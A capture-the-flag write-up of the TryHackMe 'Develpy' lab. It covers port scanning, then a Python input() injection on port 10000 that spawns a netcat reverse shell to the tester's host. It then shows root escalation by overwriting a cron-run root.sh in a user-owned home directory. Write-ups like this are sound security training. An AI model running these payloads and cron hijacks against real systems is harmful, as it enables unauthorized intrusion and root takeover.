A medium room but the privilege escalation method is quite easy.

Machine enumeration as usual:

```
┌──(kali㉿kali)-[~/Desktop/THM/Develpy]
└─$ sudo nmap -sS 10.10.70.241 > open_ports.txt

┌──(kali㉿kali)-[~/Desktop/THM/Develpy]
└─$ cat open_ports.txt         
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-22 20:36 IST
Stats: 0:00:03 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 14.50% done; ETC: 20:36 (0:00:18 remaining)
Nmap scan report for 10.10.70.241
Host is up (0.62s latency).
Not shown: 998 closed tcp ports (reset)
PORT      STATE SERVICE
22/tcp    open  ssh
10000/tcp open  snet-sensor-mgmt

Nmap done: 1 IP address (1 host up) scanned in 6.90 seconds
```

SSH and snet-sensor-mgmt on 10000. I don't know what this service is. I searched on the net but didn't get anything useful

```
┌──(kali㉿kali)-[~/Desktop/THM/Develpy]
└─$ sudo nmap -sS -sV -sC -O -Pn -p22,10000 10.10.70.241 > ports_scan.txt

┌──(kali㉿kali)-[~/Desktop/THM/Develpy]
└─$ cat ports_scan.txt 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-22 20:37 IST
Nmap scan report for 10.10.70.241
Host is up (0.45s latency).

PORT      STATE SERVICE           VERSION
22/tcp    open  ssh               OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 78:c4:40:84:f4:42:13:8e:79:f8:6b:e4:6d:bf:d4:46 (RSA)
|   256 25:9d:f3:29:a2:62:4b:24:f2:83:36:cf:a7:75:bb:66 (ECDSA)
|_  256 e7:a0:07:b0:b9:cb:74:e9:d6:16:7d:7a:67:fe:c1:1d (ED25519)
10000/tcp open  snet-sensor-mgmt?
| fingerprint-strings: 
|   GenericLines: 
|     Private 0days
|     Please enther number of exploits to send??: Traceback (most recent call last):
|     File "./exploit.py", line 6, in <module>
|     num_exploits = int(input(' Please enther number of exploits to send??: '))
|     File "<string>", line 0
|     SyntaxError: unexpected EOF while parsing
|   GetRequest: 
|     Private 0days
|     Please enther number of exploits to send??: Traceback (most recent call last):
|     File "./exploit.py", line 6, in <module>
|     num_exploits = int(input(' Please enther number of exploits to send??: '))
|     File "<string>", line 1, in <module>
|     NameError: name 'GET' is not defined
|   HTTPOptions, RTSPRequest: 
|     Private 0days
|     Please enther number of exploits to send??: Traceback (most recent call last):
|     File "./exploit.py", line 6, in <module>
|     num_exploits = int(input(' Please enther number of exploits to send??: '))
|     File "<string>", line 1, in <module>
|     NameError: name 'OPTIONS' is not defined
|   NULL: 
|     Private 0days
|_    Please enther number of exploits to send??:
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port10000-TCP:V=7.94SVN%I=7%D=10/22%Time=6717BFBD%P=x86_64-pc-linux-gnu
SF:%r(NULL,48,"\r\n\x20\x20\x20\x20\x20\x20\x20\x20Private\x200days\r\n\r\
SF:n\x20Please\x20enther\x20number\x20of\x20exploits\x20to\x20send\?\?:\x2
SF:0")%r(GetRequest,136,"\r\n\x20\x20\x20\x20\x20\x20\x20\x20Private\x200d
SF:ays\r\n\r\n\x20Please\x20enther\x20number\x20of\x20exploits\x20to\x20se
SF:nd\?\?:\x20Traceback\x20\(most\x20recent\x20call\x20last\):\r\n\x20\x20
SF:File\x20\"\./exploit\.py\",\x20line\x206,\x20in\x20<module>\r\n\x20\x20
SF:\x20\x20num_exploits\x20=\x20int\(input\('\x20Please\x20enther\x20numbe
SF:r\x20of\x20exploits\x20to\x20send\?\?:\x20'\)\)\r\n\x20\x20File\x20\"<s
SF:tring>\",\x20line\x201,\x20in\x20<module>\r\nNameError:\x20name\x20'GET
SF:'\x20is\x20not\x20defined\r\n")%r(HTTPOptions,13A,"\r\n\x20\x20\x20\x20
SF:\x20\x20\x20\x20Private\x200days\r\n\r\n\x20Please\x20enther\x20number\
SF:x20of\x20exploits\x20to\x20send\?\?:\x20Traceback\x20\(most\x20recent\x
SF:20call\x20last\):\r\n\x20\x20File\x20\"\./exploit\.py\",\x20line\x206,\
SF:x20in\x20<module>\r\n\x20\x20\x20\x20num_exploits\x20=\x20int\(input\('
SF:\x20Please\x20enther\x20number\x20of\x20exploits\x20to\x20send\?\?:\x20
SF:'\)\)\r\n\x20\x20File\x20\"<string>\",\x20line\x201,\x20in\x20<module>\
SF:r\nNameError:\x20name\x20'OPTIONS'\x20is\x20not\x20defined\r\n")%r(RTSP
SF:Request,13A,"\r\n\x20\x20\x20\x20\x20\x20\x20\x20Private\x200days\r\n\r
SF:\n\x20Please\x20enther\x20number\x20of\x20exploits\x20to\x20send\?\?:\x
SF:20Traceback\x20\(most\x20recent\x20call\x20last\):\r\n\x20\x20File\x20\
SF:"\./exploit\.py\",\x20line\x206,\x20in\x20<module>\r\n\x20\x20\x20\x20n
SF:um_exploits\x20=\x20int\(input\('\x20Please\x20enther\x20number\x20of\x
SF:20exploits\x20to\x20send\?\?:\x20'\)\)\r\n\x20\x20File\x20\"<string>\",
SF:\x20line\x201,\x20in\x20<module>\r\nNameError:\x20name\x20'OPTIONS'\x20
SF:is\x20not\x20defined\r\n")%r(GenericLines,13B,"\r\n\x20\x20\x20\x20\x20
SF:\x20\x20\x20Private\x200days\r\n\r\n\x20Please\x20enther\x20number\x20o
SF:f\x20exploits\x20to\x20send\?\?:\x20Traceback\x20\(most\x20recent\x20ca
SF:ll\x20last\):\r\n\x20\x20File\x20\"\./exploit\.py\",\x20line\x206,\x20i
SF:n\x20<module>\r\n\x20\x20\x20\x20num_exploits\x20=\x20int\(input\('\x20
SF:Please\x20enther\x20number\x20of\x20exploits\x20to\x20send\?\?:\x20'\)\
SF:)\r\n\x20\x20File\x20\"<string>\",\x20line\x200\r\n\x20\x20\x20\x20\r\n
SF:\x20\x20\x20\x20\^\r\nSyntaxError:\x20unexpected\x20EOF\x20while\x20par
SF:sing\r\n");
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 5.X
OS CPE: cpe:/o:linux:linux_kernel:5.4
OS details: Linux 5.4
Network Distance: 4 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 150.88 seconds
```

<img src=https://github.com/user-attachments/assets/c82d76d6-c880-45e6-8a3c-60cb3bef93ec>

I tried to change the method to POST, HEAD, TRACE to get something. But what simply to be done is to use `nc <MACHINE_IP> 10000`

```
┌──(kali㉿kali)-[~/Desktop/THM/Develpy]
└─$ nc 10.10.70.241 10000        

        Private 0days

 Please enther number of exploits to send??: 1

Exploit started, attacking target (tryhackme.com)...
Exploiting tryhackme internal network: beacons_seq=1 ttl=1337 time=0.042 ms
```

This script, named exploit.py, which can be noticed in the screenshot, pings the tryhackme.com site the number of times the user input.

Reverse shell can be obtained from this:

```
┌──(kali㉿kali)-[~/Desktop/THM/Develpy]
└─$ nc 10.10.70.241 10000

        Private 0days

 Please enther number of exploits to send??: __import__('os').system('nc -e /bin/bash 10.4.101.169 4444')


┌──(kali㉿kali)-[~/Desktop/THM/Develpy]
└─$ nc -nlvp 4444
listening on [any] 4444 ...
connect to [10.4.101.169] from (UNKNOWN) [10.10.70.241] 56296
whoami
king
which python
/usr/bin/python
python -c 'import pty;pty.spawn("/bin/bash")'
king@ubuntu:~$
```

```
king@ubuntu:~$ ls -l
ls -l
total 284
-rwxrwxrwx 1 king king 272113 Aug 27  2019 credentials.png
-rwxrwxrwx 1 king king    408 Aug 25  2019 exploit.py
-rw-r--r-- 1 root root     32 Aug 25  2019 root.sh
-rw-rw-r-- 1 king king    139 Aug 25  2019 run.sh
-rw-rw-r-- 1 king king     33 Aug 27  2019 user.txt
```

There is the user.txt file.

The root.sh reads as:

```
king@ubuntu:~$ cat root.sh
cat root.sh
python /root/company/media/*.py
```

This file is also in the cronjobs file, running every minute.

```
king@ubuntu:~$ cat /etc/crontab 
cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user  command
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
*  *    * * *   king    cd /home/king/ && bash run.sh
*  *    * * *   root    cd /home/king/ && bash root.sh
*  *    * * *   root    cd /root/company && bash run.sh
#
```

The root.sh file is in the king directory, and we are the user king. So for privilege escalation, simply replace the root.sh, as we are the owner of the directory, with a file with reverse shell content in it.

```
king@ubuntu:~$ nano root.sh
king@ubuntu:~$ chmod +x root.sh
king@ubuntu:~$ ls -l
total 284
-rwxrwxrwx 1 king king 272113 Aug 27  2019 credentials.png
-rwxrwxrwx 1 king king    408 Aug 25  2019 exploit.py
-rwxrwxr-x 1 king king     56 Oct 22 08:56 root.sh
-rwxrwxr-x 1 king king    139 Aug 25  2019 run.sh
-rw-rw-r-- 1 king king     33 Aug 27  2019 user.txt
```

Opening a netcat listener in another tab and waiting for the cronjobs to run the file:

```
┌──(kali㉿kali)-[~/Desktop/THM/Develpy]
└─$ nc -nlvp 9001
listening on [any] 9001 ...
connect to [10.4.101.169] from (UNKNOWN) [10.10.70.241] 39444
bash: cannot set terminal process group (1884): Inappropriate ioctl for device
bash: no job control in this shell
root@ubuntu:/home/king#
```

Root shell
